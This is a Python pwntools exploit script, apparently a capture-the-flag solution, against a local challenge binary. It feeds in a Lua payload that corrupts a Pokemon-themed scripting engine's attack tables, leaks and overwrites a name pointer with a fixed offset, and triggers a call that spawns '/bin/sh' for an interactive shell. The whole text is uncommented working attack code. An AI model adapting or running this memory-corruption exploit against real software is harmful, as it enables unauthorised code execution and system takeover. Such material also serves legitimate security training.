from pwn import *

s = process("./grunt-03fcd4dbcd3116399852dbbb6fdecf90")

pokemon = ["Lukachu", "Hannobat", "Andyball", "Airmackly"]
script = '''
p = pokemon.new("/bin/sh");
c = function (pz) 
 pokemon.doDamage(pz,15);
 pokemon.swapAttack(pz,0,1)
 pokemon.duplicateAttack(pz)
end

pokemon.addAttack(p,c);

pokemon.fight(p,"Airmackly");

q = function(a)
end

ps = {}

for i=1,100,1
do
	ps[i] = pokemon.new(string.char(0x98,0x60,0x62,0))
	pokemon.doDamage(ps[i], -7654321-i)
	pokemon.addAttack(ps[i])
	pokemon.fight(ps[i], "Airmackly")
end

fromSt = function(a)
	out = 0
	for i=1,8,1
	do
		if string.byte(a,i) then
			out = out + (string.byte(a,i)<<(8*(i-1)))
		end
	end
	return out
end
toSt = function(a)
	out = ""
	for i=1,6,1
	do
		out = out .. string.char((a>>(8*(i-1)))&0xff)
	end
	return out
end
for i=1,100,1
do
	a = -1
	b = -1
	for j=0,250,1
	do
		c = pokemon.getAttack(ps[i],j)
		if c == 6447256 then
			a = j
		end
		if c >= 7654398 and c <= 7654498 then
			b = j
			d = c-7654398 
		end
		if a ~= -1 and b ~= -1 then
			pokemon.swapAttack(ps[i], a, b+2)
			e = pokemon.getName(ps[d])
			f = fromSt(e)-0x12c9f0
			g = toSt(f)
			pokemon.setName(ps[d],g)
			pokemon.fight(p,"Andyball")
			return f
		end
	end
end
'''

script += "\x00"*(0x1000-len(script)-1)

print s.proc.pid
raw_input()
s.sendline(script)
s.interactive()
